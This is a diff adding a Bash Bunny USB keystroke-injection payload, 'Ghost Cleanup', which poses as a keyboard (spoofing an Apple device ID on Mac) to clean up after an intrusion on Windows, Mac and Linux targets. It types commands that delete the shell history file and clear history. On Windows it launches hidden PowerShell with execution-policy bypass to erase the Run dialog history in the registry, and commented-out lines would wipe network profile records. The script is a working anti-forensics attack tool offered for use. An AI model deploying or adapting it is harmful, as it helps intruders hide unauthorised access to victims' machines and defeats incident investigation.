@@ -1,0 +1,160 @@
+#!/bin/bash
+#
+# Title:         Ghost Cleanup
+# Author:        bg-wa
+# Version:       1.1
+# Target:        Windows, Mac, Unity
+# Props:         Hak5
+#
+# Cleans the input history on Windows, Mac and Unity
+#
+
+LED R G
+
+
+
+#+++ USER CONFIG +++
+
+LINES=0 # EXACT NUMBER OF LINES TO REMOVE FROM HISTORY - DEFAULT : 0 = ALL
+OS="UNITY" # OPTIONS: "UNITY", "MAC", OR "WINDOWS_RUN"
+
+# Source bunny_debug_helpers.sh for debug messages. Pass the OFF param clean to disable.
+source bunny_debug_helpers.sh
+
+# Source bunny_hid_prompt_helpers.sh for opening and closing CLI prompt.
+source bunny_hid_prompt_helpers.sh
+
+# SEARCH FOR 'INSERT CUSTOM' TO ADD MORE CODE IN THE PROPER PLACE, PER OS
+
+#+++ END USER CONFIG +++
+
+
+
+# GHOST CLEANUP
+#
+# PLATFORM CHECK
+# FOR DYNAMIC SWITCHING, CREATE FILE '/root/udisk/loot/ghost_cleanup/os_windows' IN YOUR FIRST PAYLOAD.
+if [ -f "/root/udisk/loot/ghost_cleanup/os_windows" ]; then
+    OS="WINDOWS_RUN"
+fi
+if [ -f "/root/udisk/loot/ghost_cleanup/os_mac" ]; then
+    OS="MAC"
+fi
+if [ -f "/root/udisk/loot/ghost_cleanup/os_unity" ]; then
+    OS="UNITY"
+fi
+debug_log "${OS}"
+# END PLATFORM CHECK
+
+
+# INIT FUNCTIONS
+init_keyboard()
+{
+    if [ -z "$1" ]; then
+        KEYBOARD="ATTACKMODE HID"
+    else
+        if [ "$1" = "MAC" ]; then
+            KEYBOARD="ATTACKMODE HID VID_0X05AC PID_0X021E"
+        else
+            KEYBOARD="ATTACKMODE HID"
+         fi
+    fi
+    debug_log "${KEYBOARD}"
+    ${KEYBOARD}
+    Q DELAY 500
+}
+
+clear_history_from_terminal()
+{
+    if [ "$LINES" -gt "0" ]; then
+        Q STRING head -n -$LINES \$HOME/.bash_history
+        wait_enter_wait
+        Q STRING history -c
+        wait_enter_wait
+    else
+        Q STRING rm \$HOME/.bash_history
+        wait_enter_wait
+        Q STRING history -c
+        wait_enter_wait
+    fi
+    debug_log "HISTORY CLEARED FROM TERMINAL"
+}
+
+clear_history_from_powershell()
+{
+    if [ "$LINES" -gt "0" ]; then
+        # TODO: THIS CURRENTLY DELETES ALL HISTORY, IT SHOULD JUST REMOVE THE SPECIFIED NUMBER OF LINES
+        # https://github.com/hak5/bashbunny-payloads/blob/master/payloads/library/smb_exfiltrator/payload.txt
+         Q STRING powershell -WindowStyle Hidden -Exec Bypass "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"
+         wait_enter_wait
+    else
+    # https://github.com/hak5/bashbunny-payloads/blob/master/payloads/library/smb_exfiltrator/payload.txt
+     Q STRING powershell -WindowStyle Hidden -Exec Bypass "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"
+     wait_enter_wait
+    fi
+    debug_log "HISTORY CLEARED FROM POWERSHELL"
+}
+
+unmount_drive_from_mac()
+{
+    # Q STRING diskutil unmount /Volumes/BashBunny
+    # if lines > 0; lines + 1
+    1=1
+}
+
+remove_windows_network_adapters()
+{
+    1=1
+    # Q STRING reg delete HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles /va /f
+
+    # REMOVE EXTRA ETHERNET CONNECTIONS
+    # Q STRING netsh show profiles
+    # todo ADAPTER=Get last ethernet adapter
+    # Q STRING netsh delete profile interface= $ADAPTER
+}
+
+debug_log "FUNCTIONS LOADED"
+# END FUNCTIONS
+
+
+# START CLEANUP
+init_keyboard "${OS}"
+open_prompt "${OS}"
+
+#UNITY
+if [ "${OS}" = "UNITY" ]; then
+    #++ INSERT CUSTOM UNITY CLEANUP HERE ++
+
+
+    #++ END CUSTOM UNITY CLEANUP
+
+    clear_history_from_terminal
+    close_prompt
+fi
+
+
+#MAC
+if [ "${OS}" = "MAC" ]; then
+    #++ INSERT CUSTOM MAC CLEANUP HERE ++
+
+
+    #++ END CUSTOM MAC CLEANUP
+    unmount_drive_from_mac
+    clear_history_from_terminal
+    close_prompt "MAC"
+fi
+
+
+#Windows
+if [ "${OS}" = "WINDOWS_RUN" ]; then
+    #++ INSERT CUSTOM WINDOWS CLEANUP HERE ++
+
+
+    #++ END CUSTOM WINDOWS CLEANUP
+
+    clear_history_from_powershell
+    close_prompt
+fi
+
+LED G
+# CLEANUP FINISHED
